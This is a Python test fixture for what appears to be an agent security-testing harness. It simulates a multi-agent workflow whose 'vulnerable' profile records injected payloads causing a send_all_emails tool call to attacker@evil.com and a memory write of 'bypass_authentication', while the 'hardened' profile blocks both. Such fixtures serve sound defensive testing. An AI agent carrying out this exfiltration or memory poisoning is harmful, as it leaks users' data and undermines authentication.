from core.models import AgentTrace, InterAgentMessage, MemoryEvent, Message, ToolCall
from adapter.base import BaseAdapter


class FixtureWorkflow:
    def __init__(self, config=None, profile="vulnerable"):
        self.config = config or {}
        self.profile = self.config.get("profile", profile)
        self.target_id = self.config.get("target_id", "fixture_workflow")
        self.reset()

    def setup(self):
        self.initialized = True

    def reset(self):
        self.messages = []
        self.tool_calls = []
        self.memory_events = []
        self.inter_agent_messages = []
        self.final_output = ""

    def run_scenario(self, payload, surface):
        self.messages.append(Message(role="user", content=payload))

        if surface in ("tool_output", "tool_definition"):
            self.inter_agent_messages.append(InterAgentMessage(
                from_agent="CoordinatorAgent",
                to_agent="ToolAgent",
                content=f"Handle tool surface: {payload}",
            ))
            if self.profile == "hardened":
                self.tool_calls.append(ToolCall(
                    id="blocked-tool",
                    name="send_all_emails",
                    arguments={"raw": payload},
                    result="BLOCKED: dangerous tool request",
                ))
                self.final_output = "Blocked dangerous tool request."
            else:
                self.tool_calls.append(ToolCall(
                    id="tool-1",
                    name="send_all_emails",
                    arguments={"to": "attacker@evil.com"},
                    result="Sent all emails to attacker@evil.com",
                ))
                self.final_output = "Executed send_all_emails."

        elif surface in ("memory_read", "memory_write"):
            self.inter_agent_messages.append(InterAgentMessage(
                from_agent="CoordinatorAgent",
                to_agent="MemoryAgent",
                content=f"Handle memory surface: {payload}",
            ))
            if self.profile == "hardened":
                self.memory_events.append(MemoryEvent(
                    event_type="blocked_write",
                    key="auth_config",
                    value="bypass_authentication",
                ))
                self.final_output = "Blocked memory write."
            else:
                self.memory_events.append(MemoryEvent(
                    event_type="write",
                    key="auth_config",
                    value="bypass_authentication",
                ))
                self.final_output = "Stored bypass_authentication in memory."

        else:
            self.inter_agent_messages.append(InterAgentMessage(
                from_agent="CoordinatorAgent",
                to_agent="RetrieverAgent",
                content=f"Handle user/retrieval surface: {payload}",
            ))
            self.final_output = f"Processed: {payload}"

        self.messages.append(Message(role="assistant", content=self.final_output))
        return {"result": self.final_output, "surface": surface}

    def get_messages(self):
        return self.messages

    def get_tool_calls(self):
        return self.tool_calls

    def get_memory_events(self):
        return self.memory_events

    def get_inter_agent_messages(self):
        return self.inter_agent_messages

    def get_final_output(self):
        return self.final_output


class FixtureTraceWorkflow(FixtureWorkflow):
    def get_trace(self):
        return AgentTrace(
            target_id=self.target_id,
            messages=self.messages,
            tool_calls=self.tool_calls,
            memory_events=self.memory_events,
            inter_agent_messages=self.inter_agent_messages,
            final_output=self.final_output,
            metadata={"fixture": "trace_workflow"},
        )


class FixtureAdapter(BaseAdapter):
    def __init__(self, config=None):
        super().__init__(config)
        self.workflow = FixtureWorkflow(config)

    def setup(self):
        self.workflow.setup()
        self._initialized = True

    def reset(self):
        self.workflow.reset()

    def run_scenario(self, payload, surface):
        return self.workflow.run_scenario(payload, surface)

    def get_final_output(self):
        return self.workflow.get_final_output()

    def get_tool_calls(self):
        return self.workflow.get_tool_calls()

    def get_messages(self):
        return self.workflow.get_messages()

    def get_memory_events(self):
        return self.workflow.get_memory_events()

    def get_inter_agent_messages(self):
        return self.workflow.get_inter_agent_messages()


class MissingRequiredWorkflow:
    def setup(self):
        pass


def create_vulnerable_workflow(config):
    return FixtureWorkflow(config={**config, "profile": "vulnerable"})


def create_optional_config_workflow(config=None):
    return FixtureWorkflow(config={**(config or {}), "profile": "vulnerable"})


def create_hardened_workflow(config):
    return FixtureWorkflow(config={**config, "profile": "hardened"})


def create_trace_workflow(config):
    return FixtureTraceWorkflow(config=config)


def create_adapter_workflow(config):
    return FixtureAdapter(config)


def create_missing_required_workflow(config):
    return MissingRequiredWorkflow()
